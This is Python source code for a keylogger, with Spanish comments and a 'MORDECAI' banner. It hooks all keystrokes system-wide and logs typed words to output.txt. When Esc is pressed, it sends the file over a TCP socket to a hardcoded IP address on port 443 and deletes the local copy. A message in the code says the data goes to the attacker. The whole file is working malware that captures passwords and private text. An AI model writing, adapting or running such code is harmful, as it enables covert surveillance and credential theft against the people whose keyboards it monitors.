import keyboard
import sys
import socket
import os

# Función para imprimir el banner
def imprimir_banner():
    print("\033[94m")  # Establecemos el color del texto a azul
    print("""
========================================================================================      
    
888b     d888  .d88888b.  8888888b.  8888888b.  8888888888 .d8888b.        d8888 8888888 
8888b   d8888 d88P" "Y88b 888   Y88b 888  "Y88b 888       d88P  Y88b      d88888   888   
88888b.d88888 888     888 888    888 888    888 888       888    888     d88P888   888   
888Y88888P888 888     888 888   d88P 888    888 8888888   888           d88P 888   888   
888 Y888P 888 888     888 8888888P"  888    888 888       888          d88P  888   888   
888  Y8P  888 888     888 888 T88b   888    888 888       888    888  d88P   888   888   
888   "   888 Y88b. .d88P 888  T88b  888  .d88P 888       Y88b  d88P d8888888888   888   
888       888  "Y88888P"  888   T88b 8888888P"  8888888888 "Y8888P" d88P     888 8888888 

version 1.0
========================================================================================                                                                              
            """)
    print("\033[0m")  # Restablecemos el color del texto

imprimir_banner()  # Imprimimos el banner al inicio

palabra = ""

# Función para manejar las pulsaciones de teclas
def pulsacion_tecla(pulsacion):
    global palabra
    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == 'space' or pulsacion.name == 'enter':
            guardar_palabra_al_espacio()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
            palabra += pulsacion.name

keyboard.hook(pulsacion_tecla)  # Registramos la función para manejar pulsaciones de teclas

# Función para guardar la palabra en un archivo
def guardar_palabra_al_espacio():
    with open("output.txt", "a") as file:
        file.write(palabra + "\n")
    print("\033[95m" + f"[+] Palabra registrada: {palabra}" + "\033[0m")  # Mensaje en rosa
    resetear_palabra()

# Función para resetear la palabra
def resetear_palabra():
    global palabra
    palabra = ""

# Función para enviar un archivo vía socket
def enviar_archivo_via_socket(archivo_a_enviar, direccion_ip_destino, puerto_destino):
    try:
        with open(archivo_a_enviar, 'rb') as file:
            contenido = file.read()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexion:
            print("\033[93m" + f"[*] Conectando a {direccion_ip_destino}:{puerto_destino}" + "\033[0m")  # Mensaje en naranja
            conexion.connect((direccion_ip_destino,puerto_destino))
            conexion.sendall(contenido)
            os.remove("output.txt")
            print("\033[92m" + "[+] Conexión exitosa." + "\033[0m")  # Mensaje en verde
            sys.exit()
    except Exception as e:
        print("\033[91m" + "[-] Error en la conexión: " + str(e) + "\033[0m")  # Mensaje de error en rojo

# Función para detener el script
def detener_script():
    print("Detenemos script y enviamos los datos al atacante")
    keyboard.unhook_all()
    enviar_archivo_via_socket(archivo_a_enviar,direccion_ip_destino,puerto_destino)

# Configuración de la dirección IP y puerto de destino, y el archivo a enviar
direccion_ip_destino = '192.168.1.28'
puerto_destino = 443
archivo_a_enviar = 'output.txt'

try:
    print("\033[92m" + f"[+] A la escucha en el puerto {puerto_destino}" + "\033[0m")  # Mensaje en verde
    keyboard.wait("esc")
    detener_script()
except KeyboardInterrupt:
    print("Script detenido")
    pass
